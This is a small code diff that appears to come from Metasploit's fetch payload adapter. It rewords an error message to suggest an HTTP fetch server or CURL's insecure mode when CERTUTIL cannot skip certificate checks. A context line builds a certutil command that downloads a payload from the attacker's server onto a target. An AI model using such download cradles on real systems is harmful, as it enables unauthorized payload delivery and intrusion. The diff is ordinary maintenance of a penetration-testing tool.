@@ -396,7 +396,7 @@ module Msf::Payload::Adapter::Fetch
     when 'HTTPS'
       unless datastore['FETCH_CHECK_CERT']
         # Certutil cannot disable certificate verification.
-        fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using CERTUTIL; the HTTPS server certificate must be trusted by the target')
+        fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using CERTUTIL; the HTTPS server certificate must be trusted by the target. Without a trusted certificate, use a HTTP fetch server or a FETCH_COMMAND with an insecure mode such as CURL')
       end
       get_file_cmd = "certutil -urlcache -f https://#{download_uri(uri)} #{_remote_destination}"
     else
